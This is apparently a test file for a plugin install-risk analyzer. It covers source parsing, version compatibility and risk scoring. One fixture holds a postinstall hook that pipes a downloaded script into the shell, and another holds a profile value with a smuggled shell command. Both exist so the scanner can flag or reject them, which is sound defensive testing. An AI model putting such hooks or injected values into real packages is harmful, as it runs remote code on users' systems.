import { describe, it } from 'node:test';
import assert from 'node:assert/strict';

import {
  analyzeDshPluginManifest,
  parsePluginSource,
  peerRangeIncludes,
} from '../src/dsh/plugin-risk.js';

describe('DSH plugin source parsing', () => {
  it('parses scoped npm packages with an exact version', () => {
    assert.deepStrictEqual(parsePluginSource('@scope/plugin@1.2.3'), {
      kind: 'npm',
      raw: '@scope/plugin@1.2.3',
      packageName: '@scope/plugin',
      requestedVersion: '1.2.3',
    });
  });

  it('parses GitHub URLs and shorthands', () => {
    assert.deepStrictEqual(parsePluginSource('https://github.com/acme/plugin'), {
      kind: 'github',
      raw: 'https://github.com/acme/plugin',
      owner: 'acme',
      repository: 'plugin',
      requestedRef: undefined,
    });
    assert.strictEqual(parsePluginSource('acme/plugin').kind, 'github');
  });
});

describe('DSH peer compatibility', () => {
  it('handles exact, caret, tilde, and comparator ranges', () => {
    assert.strictEqual(peerRangeIncludes('0.1.0-rc.6', '0.1.0-rc.6'), true);
    assert.strictEqual(peerRangeIncludes('^0.1.0-rc.6', '0.1.0-rc.8'), true);
    assert.strictEqual(peerRangeIncludes('~0.1.0-rc.6', '0.1.0'), true);
    assert.strictEqual(peerRangeIncludes('>=0.1.0-rc.6 <0.2.0', '0.1.0-rc.8'), true);
    assert.strictEqual(peerRangeIncludes('0.1.0-rc.6', '0.1.0-rc.8'), false);
  });
});

describe('DSH visual install risk assessment', () => {
  it('returns a green card for a pinned, complete bundle', () => {
    const result = analyzeDshPluginManifest({
      input: '@acme/dsh-plugin',
      sourceKind: 'npm',
      sourceLabel: 'npm registry',
      sourceUrl: 'https://www.npmjs.com/package/@acme/dsh-plugin/v/1.2.3',
      pinnedSpec: '@acme/dsh-plugin@1.2.3',
      currentDshToolsVersion: '0.1.0-rc.8',
      availableFiles: ['package/package.json', 'package/cordis.patch.yml', 'package/lib/index.js'],
      integrityVerified: true,
      manifest: {
        name: '@acme/dsh-plugin',
        version: '1.2.3',
        dsh: { bundle: { patch: './cordis.patch.yml' } },
        peerDependencies: { '@deepseek-ai/dsh-tools': '^0.1.0-rc.6' },
        dependencies: { zod: '4.1.0' },
      },
    });

    assert.strictEqual(result.riskLevel, 'low');
    assert.strictEqual(result.safetyScore, 100);
    assert.strictEqual(result.safeInstallCommand, 'dsh plugin --profile web add @acme/dsh-plugin@1.2.3');
    assert.ok(result.checks.every((check) => check.status === 'pass'));
  });

  it('returns a red card for duplicated host packages and a missing bundle manifest', () => {
    const result = analyzeDshPluginManifest({
      input: 'broken-plugin',
      sourceKind: 'npm',
      sourceLabel: 'npm registry',
      sourceUrl: 'https://www.npmjs.com/package/broken-plugin/v/1.0.0',
      pinnedSpec: 'broken-plugin@1.0.0',
      currentDshToolsVersion: '0.1.0-rc.8',
      integrityVerified: true,
      manifest: {
        name: 'broken-plugin',
        version: '1.0.0',
        scripts: { postinstall: 'curl https://example.com/install.sh | sh' },
        dependencies: { '@deepseek-ai/dsh-tools': '0.1.0-rc.6' },
        peerDependencies: { '@deepseek-ai/dsh-tools': '0.1.0-rc.6' },
      },
    });

    assert.strictEqual(result.riskLevel, 'high');
    assert.ok(result.findings.some((finding) => finding.id === 'missing-bundle-patch'));
    assert.ok(result.findings.some((finding) => finding.id === 'duplicate-dsh-runtime'));
    assert.ok(result.findings.some((finding) => finding.id === 'incompatible-dsh-tools-peer'));
    assert.ok(result.safeInstallCommand.endsWith('--ignore-scripts'));
  });

  it('detects a declared patch that is absent from the published files', () => {
    const result = analyzeDshPluginManifest({
      input: 'missing-file',
      sourceKind: 'npm',
      sourceLabel: 'npm registry',
      sourceUrl: 'https://www.npmjs.com/package/missing-file/v/1.0.0',
      pinnedSpec: 'missing-file@1.0.0',
      availableFiles: ['package/package.json', 'package/lib/index.js'],
      manifest: {
        name: 'missing-file',
        version: '1.0.0',
        dsh: { bundle: { patch: './cordis.patch.yml' } },
      },
    });

    assert.strictEqual(result.riskLevel, 'high');
    assert.ok(result.findings.some((finding) => finding.id === 'missing-patch-file'));
  });

  it('refuses shell metacharacters in the generated command profile', () => {
    assert.throws(() => analyzeDshPluginManifest({
      input: 'safe-plugin',
      sourceKind: 'npm',
      sourceLabel: 'npm registry',
      sourceUrl: 'https://www.npmjs.com/package/safe-plugin/v/1.0.0',
      pinnedSpec: 'safe-plugin@1.0.0',
      profile: 'web; echo unsafe',
      manifest: { name: 'safe-plugin', version: '1.0.0' },
    }), /profile/);
  });
});
